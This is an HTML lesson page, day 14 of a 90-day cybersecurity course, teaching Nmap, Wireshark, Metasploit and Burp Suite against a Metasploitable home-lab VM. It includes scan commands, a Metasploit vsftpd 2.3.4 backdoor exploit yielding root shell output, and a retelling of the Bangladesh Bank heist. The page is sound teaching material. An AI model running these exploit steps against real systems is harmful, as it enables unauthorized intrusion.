@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 14 — Kali Linux Tools: Nmap, Wireshark, Metasploit, Burp Suite</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0a0e0f;--panel:#10171a;--edge:#1c2528;--green:#39ff88;--cyan:#4fd1ff;--amber:#ffb454;--red:#ff5c5c;--purple:#b389ff;--pink:#ff6bd6;--text:#e6edf0;--muted:#7d8590;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;line-height:1.65;background-image:radial-gradient(circle at 10% 0%,rgba(57,255,136,0.06),transparent 40%),radial-gradient(circle at 90% 10%,rgba(79,209,255,0.05),transparent 40%);}
+  .wrap{max-width:900px;margin:0 auto;padding:40px 22px 100px;}
+  .topbar{display:flex;justify-content:space-between;align-items:center;font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--muted);border-bottom:1px solid var(--edge);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap;gap:10px;}
+  .pbar{width:120px;height:5px;background:var(--edge);border-radius:3px;overflow:hidden;}
+  .pbar i{display:block;width:15.5%;height:100%;background:var(--green);}
+  .day-tag{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;color:var(--amber);font-size:13px;background:rgba(255,180,84,0.08);border:1px solid rgba(255,180,84,0.3);padding:5px 12px;border-radius:20px;margin-bottom:18px;}
+  .day-tag::before{content:'●';font-size:9px;}
+  h1{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:clamp(26px,4.5vw,38px);line-height:1.2;margin-bottom:10px;}
+  h1 .accent{color:var(--green);}
+  .subtitle{color:var(--muted);font-size:15px;margin-bottom:30px;max-width:660px;}
+  section{margin-bottom:34px;}
+  .tag-pill{display:inline-flex;align-items:center;gap:8px;font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;padding:6px 14px;border-radius:20px;margin-bottom:16px;}
+  .tag-pill.theory{background:rgba(79,209,255,0.1);color:var(--cyan);border:1px solid rgba(79,209,255,0.35);}
+  .tag-pill.lab{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  .tag-pill.interview{background:rgba(179,137,255,0.1);color:var(--purple);border:1px solid rgba(179,137,255,0.35);}
+  .tag-pill.biz{background:rgba(255,180,84,0.1);color:var(--amber);border:1px solid rgba(255,180,84,0.35);}
+  .tag-pill.teach{background:rgba(255,92,92,0.1);color:var(--red);border:1px solid rgba(255,92,92,0.35);}
+  .tag-pill.ai{background:rgba(255,107,214,0.1);color:var(--pink);border:1px solid rgba(255,107,214,0.35);}
+  .tag-pill.job{background:rgba(57,255,136,0.1);color:var(--green);border:1px solid rgba(57,255,136,0.35);}
+  p{font-size:14.5px;color:#cdd6da;margin-bottom:12px;}
+  strong{color:var(--text);}
+  code{background:#070a0b;border:1px solid var(--edge);border-radius:4px;padding:2px 6px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);}
+  .card{background:var(--panel);border:1px solid var(--edge);border-radius:12px;padding:22px 24px;}
+  .callout{background:rgba(79,209,255,0.05);border-left:3px solid var(--cyan);border-radius:0 8px 8px 0;padding:12px 16px;margin:12px 0;font-size:13.5px;color:#c5d5da;}
+  .callout.amber{background:rgba(255,180,84,0.05);border-color:var(--amber);}
+  .callout.red{background:rgba(255,92,92,0.05);border-color:var(--red);}
+  .callout strong{color:var(--cyan);}
+  .callout.amber strong{color:var(--amber);}
+  .callout.red strong{color:var(--red);}
+
+  .tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-top:14px;}
+  .tool-card{background:var(--bg);border:1px solid var(--edge);border-radius:10px;padding:16px;}
+  .tool-card .tname{font-family:'IBM Plex Mono',monospace;font-size:13px;font-weight:700;margin-bottom:4px;}
+  .tool-card.nmap .tname{color:var(--green);}
+  .tool-card.wireshark .tname{color:var(--cyan);}
+  .tool-card.metasploit .tname{color:var(--red);}
+  .tool-card.burp .tname{color:var(--amber);}
+  .tool-card .trole{font-size:11px;color:var(--muted);text-transform:uppercase;font-family:'IBM Plex Mono',monospace;margin-bottom:8px;}
+  .tool-card .tdesc{font-size:12.5px;color:#cdd6da;}
+
+  .nmap-table{display:flex;flex-direction:column;gap:6px;margin-top:12px;}
+  .nmap-row{display:flex;gap:14px;align-items:flex-start;background:var(--bg);border:1px solid var(--edge);border-radius:7px;padding:9px 12px;}
+  .nmap-row code{min-width:160px;flex-shrink:0;}
+  .nmap-row .ndesc{font-size:12.5px;color:var(--muted);}
+
+  .breach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.2);border-radius:12px;padding:18px 20px;}
+  .breach-card .year{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--red);margin-bottom:5px;}
+  .breach-card .name{font-weight:700;font-size:15px;margin-bottom:7px;}
+  .breach-card .detail{font-size:13px;color:#b8c2c6;line-height:1.6;}
+
+  .mindset-grid{display:flex;gap:14px;margin-top:14px;flex-wrap:wrap;}
+  .mindset-col{flex:1;min-width:230px;border-radius:10px;padding:16px 18px;}
+  .mindset-col.attacker{background:rgba(255,92,92,0.05);border:1px solid rgba(255,92,92,0.2);}
+  .mindset-col.defender{background:rgba(57,255,136,0.05);border:1px solid rgba(57,255,136,0.2);}
+  .mindset-col .role{font-family:'IBM Plex Mono',monospace;font-size:11px;text-transform:uppercase;margin-bottom:10px;font-weight:700;}
+  .mindset-col.attacker .role{color:var(--red);}
+  .mindset-col.defender .role{color:var(--green);}
+  .mindset-col ul{padding-left:16px;font-size:13px;color:#cdd6da;}
+  .mindset-col li{margin-bottom:6px;}
+
+  .terminal{background:#070a0b;border:1px solid var(--edge);border-radius:10px;padding:0;margin-top:12px;overflow:hidden;}
+  .term-chrome{display:flex;align-items:center;gap:8px;padding:9px 14px;background:#0e1517;border-bottom:1px solid var(--edge);}
+  .term-dot{width:10px;height:10px;border-radius:50%;}
+  .term-body{padding:16px 18px;font-family:'IBM Plex Mono',monospace;font-size:12.5px;color:var(--green);overflow-x:auto;white-space:pre-wrap;line-height:1.75;}
+  .term-body .c{color:var(--muted);}
+  .term-body .out{color:#8fa5ad;}
+  .term-body .cmd{color:var(--cyan);}
+  .term-body .hi{color:var(--amber);}
+  .term-body .danger{color:var(--red);}
+
+  .lab-steps{list-style:none;counter-reset:step;margin-top:12px;}
+  .lab-steps li{counter-increment:step;position:relative;padding-left:38px;margin-bottom:12px;font-size:14px;color:#cdd6da;}
+  .lab-steps li::before{content:counter(step);position:absolute;left:0;top:0;width:24px;height:24px;border-radius:50%;background:var(--panel);border:1px solid var(--green);color:var(--green);font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;}
+  .deliverable{margin-top:10px;background:rgba(255,180,84,0.06);border:1px solid rgba(255,180,84,0.25);border-radius:8px;padding:11px 15px;font-size:13px;color:var(--amber);}
+
+  .interview-box{border-left:3px solid var(--purple);padding-left:16px;margin-top:12px;}
+  .interview-box .q{font-weight:600;font-size:14px;margin-bottom:7px;color:var(--text);}
+  .interview-box .a{font-size:13.5px;color:#b8c2c6;line-height:1.6;}
+
+  .ai-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;margin-top:12px;}
+  .ai-card{background:rgba(255,107,214,0.04);border:1px solid rgba(255,107,214,0.18);border-radius:10px;padding:14px;}
+  .ai-card .aname{font-family:'IBM Plex Mono',monospace;font-weight:700;font-size:12.5px;color:var(--pink);margin-bottom:5px;}
+  .ai-card .adesc{font-size:12px;color:var(--muted);}
+
+  .job-card{background:rgba(57,255,136,0.04);border:1px solid rgba(57,255,136,0.15);border-radius:12px;padding:18px 20px;}
+  .job-card .label{font-family:'IBM Plex Mono',monospace;color:var(--green);font-size:11px;text-transform:uppercase;letter-spacing:0.06em;margin-bottom:10px;}
+  .job-card ul{padding-left:16px;font-size:13.5px;color:#cdd6da;}
+  .job-card li{margin-bottom:8px;}
+
+  .biz-card{background:linear-gradient(135deg,rgba(255,180,84,0.06),rgba(57,255,136,0.04));border:1px solid rgba(255,180,84,0.2);border-radius:12px;padding:18px 20px;}
+  .teach-card{background:rgba(255,92,92,0.04);border:1px solid rgba(255,92,92,0.15);border-radius:12px;padding:18px 20px;}
+
+  .res-grid{display:grid;gap:10px;margin-top:10px;}
+  .res-card{display:flex;gap:12px;align-items:flex-start;background:var(--panel);border:1px solid var(--edge);border-radius:10px;padding:14px 16px;text-decoration:none;color:var(--text);transition:border-color .2s;}
+  .res-card:hover{border-color:var(--cyan);}
+  .res-icon{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--bg);border-radius:5px;padding:3px 8px;flex-shrink:0;margin-top:2px;font-weight:700;}
+  .res-icon.en{background:var(--red);}
+  .res-icon.hi{background:var(--amber);}
+  .res-icon.lab{background:var(--green);}
+  .res-title{font-weight:600;font-size:13.5px;}
+  .res-desc{font-size:12px;color:var(--muted);margin-top:2px;}
+
+  .mistakes-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:8px;margin-top:12px;}
+  .mistake-item{display:flex;align-items:flex-start;gap:8px;background:var(--bg);border:1px solid var(--edge);border-radius:8px;padding:9px 11px;font-size:12.5px;color:#b8c2c6;}
+  .mistake-item .check{color:var(--green);font-weight:700;flex-shrink:0;}
+
+  .checklist{list-style:none;}
+  .checklist li{display:flex;align-items:flex-start;gap:10px;padding:9px 0;border-bottom:1px solid var(--edge);font-size:14px;color:#cdd6da;}
+  .checklist li:last-child{border-bottom:none;}
+  .checklist .box{width:17px;height:17px;border:1.5px solid var(--green);border-radius:4px;flex-shrink:0;margin-top:2px;}
+
+  .stamp-wrap{display:flex;justify-content:center;margin:44px 0 28px;}
+  .stamp{border:3px solid var(--green);border-radius:50%;width:155px;height:155px;display:flex;flex-direction:column;align-items:center;justify-content:center;transform:rotate(-8deg);color:var(--green);font-family:'IBM Plex Mono',monospace;text-transform:uppercase;box-shadow:0 0 28px rgba(57,255,136,0.12);}
+  .stamp .l1{font-size:10px;letter-spacing:0.1em;}
+  .stamp .l2{font-size:22px;font-weight:700;margin:4px 0;}
+  .stamp .l3{font-size:10px;letter-spacing:0.1em;}
+
+  .next-up{background:linear-gradient(135deg,rgba(57,255,136,0.05),rgba(79,209,255,0.03));border:1px solid var(--edge);border-radius:12px;padding:20px 24px;display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;}
+  .next-up .label{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--muted);margin-bottom:4px;}
+  .next-up .title{font-weight:700;font-size:16px;}
+  .next-up .arrow{font-family:'IBM Plex Mono',monospace;color:var(--cyan);font-size:24px;}
+
+  footer{margin-top:28px;text-align:center;color:var(--muted);font-size:12px;font-family:'IBM Plex Mono',monospace;}
+  @media(max-width:600px){.wrap{padding:26px 14px 70px;} .nmap-row{flex-wrap:wrap;}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="topbar">
+    <span>robin@gcek-it:~/roadmap/day14$ cat lesson.md</span>
+    <div style="display:flex;align-items:center;gap:6px;">Day 14/90 <div class="pbar"><i></i></div></div>
+  </div>
+
+  <div class="day-tag">DAY 14 OF 90</div>
+  <h1>Kali Linux Tools <span class="accent">— Nmap, Wireshark, Metasploit, Burp Suite</span></h1>
+  <p class="subtitle">Day 13 built the lab. Today you actually use it — four tools that appear in every professional penetration test, every SOC investigation, and almost every technical interview for a security role.</p>
+
+  <!-- THEORY -->
+  <section>
+    <span class="tag-pill theory">THEORY</span>
+    <div class="card">
+      <p>Every security engagement uses a small core set of tools repeatedly. Today's four are the industry's most recognized — used by attackers, defenders, and everything in between. The goal today is not to master each one — it's to run each one against Metasploitable and understand what you're seeing.</p>
+
+      <div class="tool-grid">
+        <div class="tool-card nmap">
+          <div class="tname">Nmap</div>
+          <div class="trole">Network Scanner / Recon</div>
+          <div class="tdesc">Maps open ports, services, OS, and version information across any IP range. The first tool run in almost every penetration test — "what's here and what's running?"</div>
+        </div>
+        <div class="tool-card wireshark">
+          <div class="tname">Wireshark</div>
+          <div class="trole">Packet Analyzer</div>
+          <div class="tdesc">Captures and reads every packet on a network interface in real time. Used by attackers to intercept traffic AND by defenders to analyze incidents. Lazarus Group used it to steal $81M.</div>
+        </div>
+        <div class="tool-card metasploit">
+          <div class="tname">Metasploit</div>
+          <div class="trole">Exploitation Framework</div>
+          <div class="tdesc">Database of exploits for known vulnerabilities. You pick a target service, choose an exploit, run it. Pre-built modules mean you can test a known CVE in 5 commands. Used extensively in authorized pentests.</div>
+        </div>
+        <div class="tool-card burp">
+          <div class="tname">Burp Suite</div>
+          <div class="trole">Web App Proxy / Tester</div>
+          <div class="tdesc">Sits between your browser and a website, intercepting every HTTP request. Lets you modify, replay, and analyze web traffic. The standard tool for web application security testing.</div>
+        </div>
+      </div>
+
+      <p style="margin-top:16px;"><strong>Nmap switches you must know for any interview or lab:</strong></p>
+      <div class="nmap-table">
+        <div class="nmap-row"><code>nmap -sV [ip]</code><div class="ndesc">Service version detection — shows exactly what software is running on each port.</div></div>
+        <div class="nmap-row"><code>nmap -sS [ip]</code><div class="ndesc">SYN scan (stealth) — sends SYN, receives SYN-ACK, but never completes handshake. Faster, less likely to appear in logs.</div></div>
+        <div class="nmap-row"><code>nmap -O [ip]</code><div class="ndesc">OS detection — guesses the target operating system from network behavior.</div></div>
+        <div class="nmap-row"><code>nmap -A [ip]</code><div class="ndesc">Aggressive scan — combines -sV, -O, traceroute, and NSE scripts. Loud but comprehensive.</div></div>
+        <div class="nmap-row"><code>nmap --script vuln [ip]</code><div class="ndesc">Run Nmap's vulnerability detection scripts against the target — quick CVE check in one command.</div></div>
+        <div class="nmap-row"><code>nmap -p- [ip]</code><div class="ndesc">Scan all 65,535 ports instead of the default top 1,000. Slower but finds hidden services.</div></div>
+      </div>
+
+      <div class="callout" style="margin-top:14px;"><strong>Wireshark key filters for security work:</strong> <code>http</code> (show only HTTP traffic), <code>tcp.port == 80</code> (specific port), <code>ip.addr == 192.168.56.102</code> (single host), <code>tcp.flags.syn == 1</code> (see SYN packets — spot scanners). These four cover 80% of basic traffic analysis.</div>
+    </div>
+  </section>
+
+  <!-- REAL INCIDENT -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// real named incident</div>
+    <div class="breach-card">
+      <div class="year">2016 — BANGLADESH BANK SWIFT HEIST — $81M STOLEN USING WIRESHARK</div>
+      <div class="name">Lazarus Group used Wireshark to study bank traffic for weeks before stealing $81 million</div>
+      <div class="detail">In 2016, the Lazarus Group (North Korean state-sponsored attackers) compromised computers inside Bangladesh's central bank and installed Wireshark — a standard, legitimate network analyzer — to capture and analyze SWIFT financial transaction traffic in real time. They observed the exact format, authentication flow, and timing of legitimate SWIFT messages for weeks without triggering any alerts. Once they understood the protocol completely, they crafted fraudulent SWIFT transfer requests that successfully moved $81 million to accounts in the Philippines before the fraud was caught (another $850M was blocked due to a spelling error in one of the transfer requests). Wireshark didn't "hack" anything — it just listened. That listening turned into the largest bank cyber-theft in history at the time. This is why unencrypted internal traffic is dangerous even on your "private" network — any compromised host with a packet sniffer becomes a full surveillance point.</div>
+    </div>
+  </section>
+
+  <!-- MINDSET -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:14px;">// attacker vs defender mindset</div>
+    <div class="mindset-grid">
+      <div class="mindset-col attacker">
+        <div class="role">⚔ Attacker</div>
+        <ul>
+          <li>Nmap first — always. "What's running?" before anything else. vsftpd 2.3.4 on Metasploitable from Day 13 has a known backdoor — Nmap + Metasploit finds and exploits it in under 5 minutes.</li>
+          <li>Wireshark on a compromised host gives you everything the victim sends in plaintext — credentials, session tokens, internal protocol details.</li>
+          <li>Burp Suite intercepts web logins — change the username or parameter value before it reaches the server. No code needed.</li>
+        </ul>
+      </div>
+      <div class="mindset-col defender">
+        <div class="role">🛡 Defender</div>
+        <ul>
+          <li>Nmap your own perimeter regularly — find what's exposed before an attacker does. "Know thy network" is the first rule of defense.</li>
+          <li>Wireshark in a SOC context: when something suspicious happens, capture traffic on the affected segment and look for anomalies — C2 beaconing, data exfiltration, credential harvesting.</li>
+          <li>Encrypt internal traffic. Lazarus's entire Wireshark campaign was possible because SWIFT traffic inside the bank was unencrypted — they read it like a book.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- LAB -->
+  <section>
+    <span class="tag-pill lab">HANDS-ON LAB — ALL FOUR TOOLS IN YOUR HOME LAB</span>
+    <div class="card">
+      <p>Run these in order against Metasploitable (your legal target from Day 13). Each builds on the last.</p>
+      <ol class="lab-steps">
+        <li>Go to <strong>tryhackme.com/room/nmap</strong> — complete the Nmap scan types section to get TryHackMe lab credit alongside your home lab practice.</li>
+        <li>Run the Nmap commands below against Metasploitable — execute the aggressive scan and the vulnerability script scan specifically.</li>
+        <li>Start Wireshark on Kali while running an Nmap scan — watch the SYN packets fly in real time. Apply the filter <code>tcp.flags.syn == 1</code> and see your own scan pattern.</li>
+        <li>Launch Metasploit and exploit vsftpd 2.3.4 on Metasploitable using the script below — this is your first real exploit against a real service.</li>
+        <li>Open Burp Suite, configure your browser to use it as a proxy (127.0.0.1:8080), browse to the Metasploitable DVWA web app at its IP on port 80, and intercept one login request.</li>
+      </ol>
+      <div class="deliverable"><strong>Deliverable:</strong> four screenshots — Nmap -A output, Wireshark capture with SYN filter, Metasploit session shell on Metasploitable, and one intercepted HTTP request in Burp Suite. This is your Phase 1 capstone proof.</div>
+    </div>
+
+    <div class="terminal">
+      <div class="term-chrome"><div class="term-dot" style="background:#ff5f56;"></div><div class="term-dot" style="background:#ffbd2e;"></div><div class="term-dot" style="background:#27c93f;"></div></div>
+      <div class="term-body"><span class="c"># ─── NMAP ───────────────────────────────────────</span>
+<span class="c"># aggressive scan — service, OS, scripts, traceroute</span>
+<span class="cmd">nmap -A 192.168.56.102</span>
+<span class="out">PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.3.4
+| ftp-vsftpd-backdoor: VULNERABLE</span>
+
+<span class="c"># vulnerability script scan</span>
+<span class="cmd">nmap --script vuln 192.168.56.102</span>
+<span class="out">| ftp-vsftpd-backdoor:
+|   VULNERABLE: vsftpd 2.3.4 backdoor</span>
+<span class="hi"># Nmap just confirmed the backdoor exists before we even touch Metasploit</span>
+
+<span class="c"># ─── WIRESHARK ──────────────────────────────────</span>
+<span class="c"># open Wireshark GUI from Kali, select eth0, start capture</span>
+<span class="c"># while running nmap, apply this filter to see your own SYN scan:</span>
+<span class="cmd">Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0</span>
+<span class="hi"># you'll see thousands of SYN packets — this is what your scan looks like to a defender</span>
+
+<span class="c"># ─── METASPLOIT ─────────────────────────────────</span>
+<span class="cmd">msfconsole</span>
+<span class="out">msf6 ></span>
+<span class="cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span>
+<span class="cmd">set RHOSTS 192.168.56.102</span>
+<span class="cmd">run</span>
+<span class="out">[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
+[+] 192.168.56.102:6200 - Shell command execution succeeded
+[*] Found shell.
+id</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="hi"># root shell on Metasploitable — you just ran your first real exploit</span>
+
+<span class="c"># ─── BURP SUITE ─────────────────────────────────</span>
+<span class="c"># launch from Kali: Applications → Web Application Analysis → Burp Suite</span>
+<span class="c"># set browser proxy to 127.0.0.1:8080</span>
+<span class="c"># browse to http://192.168.56.102/dvwa/ and login</span>
+<span class="c"># Burp intercepts the POST request — you'll see the password in plain text</span>
+<span class="out">POST /dvwa/login.php HTTP/1.1
+username=admin&password=password&Login=Login</span>
+<span class="hi"># this is what Lazarus Group saw inside Bangladesh Bank — but on SWIFT traffic</span></div>
+    </div>
+  </section>
+
+  <!-- INTERVIEW -->
+  <section>
+    <span class="tag-pill interview">INTERVIEW READY</span>
+    <div class="card">
+      <div class="interview-box">
+        <div class="q">Q: "Walk me through how you'd approach a penetration test at a high level."</div>
+        <div class="a">A: "Starting with Nmap — I'd run a service version scan to identify what's running and on which ports, then use the vulnerability script to flag known CVEs immediately. Anything interesting gets investigated with Burp Suite if it's web-facing, or Metasploit if it's a network service with a known exploit. Throughout I'd have Wireshark running on my interface to capture traffic — both to understand the network's communication patterns and to capture any cleartext credentials in transit. The Bangladesh Bank SWIFT heist is the clearest example of why traffic capture matters even inside a 'trusted' network — Lazarus Group used Wireshark in passive mode for weeks and learned an entire banking protocol just by listening."</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- AI TOOLS -->
+  <section>
+    <span class="tag-pill ai">AI TOOLS</span>
+    <div class="ai-grid">
+      <div class="ai-card">
+        <div class="aname">ChatGPT + Nmap output</div>
+        <div class="adesc">Paste your full Nmap scan output and ask "what are the highest-priority vulnerabilities here and which Metasploit modules target them?" Instant threat analysis.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Wireshark + AI filters</div>
+        <div class="adesc">Describe suspicious traffic in plain language to ChatGPT and ask it to write the Wireshark display filter — e.g., "find all traffic going to port 443 except from my IP."</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Burp Suite AI (Pro)</div>
+        <div class="adesc">Burp Suite Professional includes an AI-assisted scanner. Free community edition covers manual testing — the Pro AI extension auto-finds OWASP Top 10 vulnerabilities.</div>
+      </div>
+      <div class="ai-card">
+        <div class="aname">Metasploit + AI</div>
+        <div class="adesc">Ask Claude/ChatGPT "which Metasploit module targets vsftpd 2.3.4 and what options does it need?" — faster than searching exploit-db manually during a lab session.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- JOB -->
+  <section>
+    <span class="tag-pill job">HOW THIS GETS YOU PLACED</span>
+    <div class="job-card">
+      <div class="label">// placement & resume angles</div>
+      <ul>
+        <li><strong>Resume bullet:</strong> "Performed authorized vulnerability assessments using Nmap (service/vuln scans), Metasploit (vsftpd CVE exploitation), Wireshark (traffic capture and analysis), and Burp Suite (HTTP interception) in an isolated home lab environment."</li>
+        <li><strong>Campus interview:</strong> Say — "I've used all four core Kali tools hands-on in my own home lab against Metasploitable 2. I ran an Nmap vulnerability scan, confirmed vsftpd 2.3.4's backdoor, exploited it with Metasploit to get a root shell, and captured the traffic in Wireshark simultaneously. I also intercepted a login request in Burp Suite to see credentials in plaintext — the same passive observation technique Lazarus Group used in the Bangladesh Bank SWIFT heist." This demonstrates a complete, linked workflow most interviewers never hear from a student.</li>
+        <li><strong>Portfolio:</strong> Write a short blog-style writeup of your Metasploitable exploit session — what you found, how you exploited it, what shell you got. Post it on Medium or GitHub. Hiring managers read these. A real exploit writeup is worth more than ten certificates.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- BIZ -->
+  <section>
+    <span class="tag-pill biz">ENTREPRENEUR ANGLE</span>
+    <div class="biz-card">
+      <p>These four tools together form the basic toolkit of a freelance penetration test. An authorized scan of a small business's network perimeter (Nmap for exposure, Burp for their website, Wireshark for internal traffic hygiene, Metasploit for known CVE validation) is a real, deliverable service at ₹10,000–₹30,000 for a small engagement. Every tool you learn today is a line item in your future firm's service catalogue. Knowing Bangladesh Bank lost $81M to a passive Wireshark install makes "we'll check if your internal traffic is encrypted" an easy sell.</p>
+    </div>
+  </section>
+
+  <!-- TEACH IT BACK -->
+  <section>
+    <span class="tag-pill teach">TEACH IT BACK</span>
+    <div class="teach-card">
+      <p>Explain to a non-technical person: "Nmap is a door-checker — it walks up to every door in a building and notes which ones are open and what's on the other side. Wireshark is a wire-tap — it listens to every conversation in the building without joining them. Metasploit is a skeleton-key collection — once Nmap finds a known weak lock, Metasploit has the key for it. Burp Suite is a letter-opener — it reads your mail before it gets delivered, lets you modify it, then reseals it. Lazarus Group used the wire-tap (Wireshark) to learn the exact language of Bangladesh Bank's internal conversations, then sent fake letters (Burp-style HTTP manipulation) that looked identical to real ones — and walked out with $81 million."</p>
+    </div>
+  </section>
+
+  <!-- VIDEOS -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// watch</div>
+    <div class="res-grid">
+      <a class="res-card" href="https://www.youtube.com/watch?v=KWjXdEdF8-U" target="_blank">
+        <span class="res-icon en">EN</span>
+        <div><div class="res-title">Beginner Kali Linux Recon: Nmap & Wireshark in a Real Homelab (July 2025)</div><div class="res-desc">youtube.com/watch?v=KWjXdEdF8-U — Nmap + Wireshark together in a VirtualBox home lab. Exactly today's setup.</div></div>
+      </a>
+      <a class="res-card" href="https://www.youtube.com/watch?v=raW8omLuO-4" target="_blank">
+        <span class="res-icon hi">HI</span>
+        <div><div class="res-title">Ethical Hacking Lecture 10: Kali Linux + Nmap [Hindi/Urdu]</div><div class="res-desc">youtube.com/watch?v=raW8omLuO-4 — Nmap explained in Hindi/Urdu with Kali Linux installation context.</div></div>
+      </a>
+      <a class="res-card" href="https://tryhackme.com/room/nmap" target="_blank">
+        <span class="res-icon lab">LAB</span>
+        <div><div class="res-title">TryHackMe — Nmap (comprehensive room)</div><div class="res-desc">Free room — covers all Nmap scan types, NSE scripts, firewall evasion. Today's TryHackMe lab credit.</div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- MISTAKES -->
+  <section>
+    <div style="font-family:'IBM Plex Mono',monospace;font-size:12px;color:var(--cyan);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">// mistakes avoided today</div>
+    <div class="mistakes-grid">
+      <div class="mistake-item"><span class="check">✓</span> Bangladesh Bank / Lazarus Group (2016) — Wireshark used as an attacker tool with $81M real-world impact.</div>
+      <div class="mistake-item"><span class="check">✓</span> 70% hands-on — all four tools actually run against Metasploitable, not just described.</div>
+      <div class="mistake-item"><span class="check">✓</span> First real exploit (vsftpd 2.3.4) executed in an authorized home lab — proper white-hat context.</div>
+      <div class="mistake-item"><span class="check">✓</span> Exploit writeup for portfolio suggested — build-in-public, not just practice in private.</div>
+      <div class="mistake-item"><span class="check">✓</span> Progress vs Day 1–13 baseline. Day 14 is a milestone — Phase 1 complete tomorrow.</div>
+    </div>
+  </section>
+
+  <!-- CHECKLIST -->
+  <section>
+    <div class="card">
+      <ul class="checklist">
+        <li><span class="box"></span> I ran <code>nmap -A</code> and <code>nmap --script vuln</code> against Metasploitable and read the output.</li>
+        <li><span class="box"></span> I opened Wireshark during an Nmap scan and saw my own SYN packets in the capture.</li>
+        <li><span class="box"></span> I exploited vsftpd 2.3.4 with Metasploit and got a root shell on Metasploitable.</li>
+        <li><span class="box"></span> I intercepted at least one HTTP request in Burp Suite.</li>
+        <li><span class="box"></span> I completed the TryHackMe Nmap room scan types section.</li>
+        <li><span class="box"></span> I can explain how Lazarus Group used Wireshark in the Bangladesh Bank heist.</li>
+      </ul>
+    </div>
+  </section>
+
+  <div class="stamp-wrap">
+    <div class="stamp"><div class="l1">Day Complete</div><div class="l2">14 / 90</div><div class="l3">Verified ✓</div></div>
+  </div>
+
+  <div class="next-up">
+    <div>
+      <div class="label">tomorrow — day 15</div>
+      <div class="title">Phase 1 review & mini quiz — foundations complete, Phase 2 begins</div>
+    </div>
+    <div class="arrow">→</div>
+  </div>
+
+  <footer>say "Day 15" when ready — one concept, one hour, one day at a time.</footer>
+
+</div>
+</body>
+</html>
